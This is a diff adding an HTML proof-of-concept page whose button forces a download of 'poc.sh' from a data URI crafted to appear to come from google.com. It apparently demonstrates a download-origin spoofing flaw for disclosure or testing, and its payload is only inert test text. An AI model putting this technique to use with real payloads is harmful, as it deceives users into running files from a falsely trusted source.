@@ -1,0 +1,33 @@
+ <!DOCTYPE html>
+ <html lang="en">
+ <head>
+   <meta charset="UTF-8">
+   <title>Download & Fullscreen on Click</title>
+ </head>
+ <body>
+   <center>
+     <h2>POC</h2>
+     <button onclick="openWin()">Click to Download</button>
+   </center>
+ 
+   <script>
+     // Download helper
+     function Puf(uri, name) {
+       const link = document.createElement("a");
+       link.href = uri;
+       link.download = name;
+       document.body.appendChild(link);
+       link.click();
+       document.body.removeChild(link);
+     }
+ 
+     // Trigger “APK” download
+     function openWin() {
+       Puf(
+         "data://google.com/application/javascript;base64,ZXN0dGVzdGVzdHRlc3Q=",
+         "poc.sh"
+       );
+     }
+   </script>
+ </body>
+ </html>
